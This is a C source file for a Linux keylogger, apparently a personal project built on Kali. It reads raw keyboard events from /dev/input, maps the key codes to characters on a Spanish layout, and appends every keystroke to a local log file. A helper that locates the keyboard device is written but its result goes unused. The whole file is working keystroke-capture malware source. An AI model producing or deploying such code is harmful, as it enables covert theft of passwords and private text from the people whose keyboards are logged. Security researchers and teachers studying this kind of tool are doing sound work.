#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/kali/keylogger_project/keylogger.txt"

struct input_event ev;
char *getEvent();

int main() {
    // Get the keyboard event path
    char *eventPath = getEvent();
    if (eventPath == NULL) {
        fprintf(stderr, "Failed to find keyboard event path.\n");
        return 1;
    }

    // Open the input device
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) {
        perror("Failed to open input device");
        return 1;
    }

    // Open the log file
    FILE *logFile = fopen(LOGFILEPATH, "a");
    if (logFile == NULL) {
        perror("Failed to open log file");
        close(fd);
        return 1;
    }

    // Array to map key codes to characters
    const char *keyMap[] = {
            "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "'", "¡",
    "<BACKSPACE>", "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "`", "+", "<ENTER>", "<CTRL>", "a", "s", "d", "f", "g", "h", "j", "k", "l",
    "ñ", "{", "}", "<LSHIFT>", "<|>", "z", "x", "c", "v", "b", "n", "m", ",", ".",
    "-", "<RSHIFT>", "*", "<ALT>", " ", "<CAPSLOCK>"
    };

    // Read the input events and log them
    while (1) {
        ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
        if (bytesRead == -1) {
            perror("Failed to read input event");
            break;
        }

        // Check for key press events
        if (ev.type == EV_KEY && ev.value == 1) {  // EV_KEY is a key press event
            if (ev.code < sizeof(keyMap) / sizeof(keyMap[0])) {
                fprintf(logFile, "%s", keyMap[ev.code]);  // Write the corresponding character to the log file
                fflush(logFile);  // Ensure the log is written immediately
            }
        }
    }

    // Clean up
    fclose(logFile);
    close(fd);
    free(eventPath);

    return 0;
}

char *getEvent() {
    const char *deviceFile = "/proc/bus/input/devices";
    const char *keyword = "keyboard";
    const char *eventDir = "/dev/input/";
    char line[256];
    char eventPath[512];
    char *keyboardEvent = NULL;

    FILE *fp = fopen(deviceFile, "r");
    if (fp == NULL) {
        perror("Failed to open devices file");
        return NULL;
    }

    // Read the devices file and find the keyboard input event
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, keyword)) {
            while (fgets(line, sizeof(line), fp)) {
                if (strstr(line, "H: Handlers=")) {
                    char *eventStart = strstr(line, "event");
                    if (eventStart) {
                        snprintf(eventPath, sizeof(eventPath), "%s%s", eventDir, eventStart);
                        eventPath[strcspn(eventPath, "\n")] = 0;  // Remove newline character
                        keyboardEvent = strdup(eventPath);
                        break;
                    }
                }
            }
        }
        if (keyboardEvent != NULL) {
            break;
        }
    }

    fclose(fp);
    return keyboardEvent;
}
